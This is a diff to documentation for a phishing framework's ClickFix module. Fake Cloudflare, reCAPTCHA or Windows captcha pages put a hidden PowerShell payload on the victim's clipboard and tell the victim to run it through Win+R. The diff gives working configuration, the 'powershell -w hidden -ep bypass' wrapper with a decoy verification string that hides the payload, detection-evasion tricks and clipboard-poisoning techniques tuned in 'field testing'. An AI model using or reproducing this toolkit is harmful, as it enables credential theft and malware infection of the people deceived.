@@ -19,20 +19,25 @@ This is configured **per-phishlet** in the YAML — no separate object to manage
 Victim visits lure URL
   │
   ├─ position: before ─────────────────────────────────┐
-  │   Fake captcha page (Cloudflare/recaptcha/Windows) │
+  │   Stage 1: captcha widget (checkbox only)          │
   │   → checkbox click → clipboard = {command}         │
-  │   → instructions: Win+R, Ctrl+V, Enter            │
-  │   → verify click → redirect to phishing login      │
+  │   Stage 2: instructions — Win+R, Ctrl+V, Enter     │
+  │   → silent redirect → phishing login               │
   │   → victim enters credentials → captured           │
   │                                                    │
   ├─ position: after ──────────────────────────────────┤
   │   Victim enters credentials → captured             │
   │   → "One more step" captcha page                   │
   │   → checkbox click → clipboard = {command}         │
-  │   → instructions: Win+R, Ctrl+V, Enter            │
-  │   → verify click → redirect to real site           │
+  │   → instructions — Win+R, Ctrl+V, Enter            │
+  │   → redirect to real site                          │
   └────────────────────────────────────────────────────┘
 ```
+
+`windows-fix` replicates the real-world ClickFix campaigns (as documented by
+Malwarebytes, 2025-03): a pixel-faithful Google reCAPTCHA widget first, the
+instruction panel only appears *after* the checkbox is ticked, and there is no
+Verify button — "verification" completes when the victim runs the command.
 
 ## Configuration
 
@@ -43,6 +48,8 @@ clickfix:
   template: cloudflare-turnstile     # template name (see below)
   command: "powershell -w hidden -e <base64>"  # payload to clipboard
   position: before                    # "before" (pre-login) or "after" (post-capture)
+  only: false                         # true = clickfix-only mode (no login flow)
+  subdomain: login.example.com        # display domain override (if the template shows one)
 ```
 
 | Field | Description |
@@ -50,9 +57,32 @@ clickfix:
 | `template` | Template file name: `clickfix/templates/<name>.html` |
 | `command` | Payload string copied to the victim's clipboard |
 | `position` | `before` = pre-login gate; `after` = post-capture "one more step" |
+| `only` | Clickfix-only mode: the gate is served *before* session creation and the victim is redirected to the lure's `redirect_url` afterwards — pure payload delivery, no credential flow |
+| `subdomain` | Display domain shown inside the page (branding override; empty = request host) |
 
 Hot-reload applies immediately — edit the phishlet YAML and the gate activates
 on the next victim request (no service restart).
+
+## The clipboard command and Verification ID
+
+Unless the `command` already starts with a known interpreter
+(`powershell`, `cmd`, `mshta`, `rundll32`, `certutil`, `bitsadmin`, `curl`,
+`wget`, `start` — passed through as-is), the payload is wrapped in a
+PowerShell one-liner whose **unified tail is identical across every template**:
+
+```
+powershell -w hidden -ep bypass -c "<command>;$id='I am not a robot - reCAPTCHA Verification ID: 4821'"
+```
+
+- The **Verification ID is a random 4-digit number generated server-side per
+  request** (real-campaign format) and substituted into **both** the clipboard
+  command and the page display — they always match.
+- The tail is long enough that in the Windows Run dialog only
+  `... 'I am not a robot - reCAPTCHA Verification ID: 4821'` stays visible —
+  the payload scrolls out of view, exactly like the observed campaigns.
+- `I am not a robot` (no apostrophe) is deliberate: the string must stay safe
+  inside PowerShell single quotes. The page itself displays the variant with
+  the apostrophe (`I'm not a robot`), mirroring the real pages.
 
 ## Templates
 
@@ -61,8 +91,8 @@ campaign phishlets). Three styles ship with the fork:
 
 | Template | Visual style |
 |---|---|
-| `cloudflare-turnstile` | "Checking if you are human" + Turnstile checkbox widget |
-| `windows-fix` | Windows Security dialog "Verification Required" |
+| `cloudflare-turnstile` | "Checking if you are human" + Turnstile checkbox widget, Cloudflare branding |
+| `windows-fix` | Real-campaign replica: Google reCAPTCHA widget → instruction panel with keyboard-key badges and the observe/agree line |
 | `recaptcha` | Google reCAPTCHA "I'm not a robot" checkbox |
 
 ### Placeholders
@@ -99,9 +129,9 @@ phishing pages ([CSD hardening](evasion#4-csd-hardening-client-side-detection)):
 3. **Lazy text injection** — all social-engineering keywords are base64
    strings in the source, decoded and injected into the DOM only when the
    state machine advances after a user gesture.
-4. **Brand lazy-reveal** — logo and domain hidden behind
-   `visibility:hidden` until the first `pointermove`/`keydown` (same as the
-   ms365 CSD v2 pattern).
+4. **Brand lazy-reveal** (templates with branded headers) — logo and domain
+   hidden behind `visibility:hidden` until the first
+   `pointermove`/`keydown` (same as the ms365 CSD v2 pattern).
 5. **Randomized fingerprint** — variable timing, random verification IDs,
    dynamic text injection order — no byte-identical page across loads.
 6. **Inline SVG favicon** (brand-matched) + generic title +
@@ -109,15 +139,17 @@ phishing pages ([CSD hardening](evasion#4-csd-hardening-client-side-detection)):
 
 ## Clipboard mechanism
 
-The templates use two independent poisoning methods:
+Poisoning uses the hidden-textarea `document.execCommand('copy')` technique —
+deliberately **not** `navigator.clipboard.writeText()`, which triggers a
+clipboard permission popup outside a user gesture and breaks the illusion
+(lesson learned in field testing).
 
-1. **Primary**: on checkbox click, `navigator.clipboard.writeText()` +
-   `document.execCommand('copy')` (hidden textarea technique)
-2. **Backup**: global `copy` event interceptor — the victim's own copy
-   operations are replaced with the payload
+The payload is armed at three points:
 
-The payload is re-armed on every checkbox click and every "Verify" click,
-so multiple attempts are possible.
+1. **First gesture anywhere** (`pointerdown`/`keydown`, once) — covers victims
+   who arrive mid-page and interact before touching the widget
+2. **Checkbox click** — the primary, gesture-guaranteed copy
+3. **Again when the instruction panel opens** — belt-and-braces re-copy
 
 ## Integration hooks (maintainer reference)
 
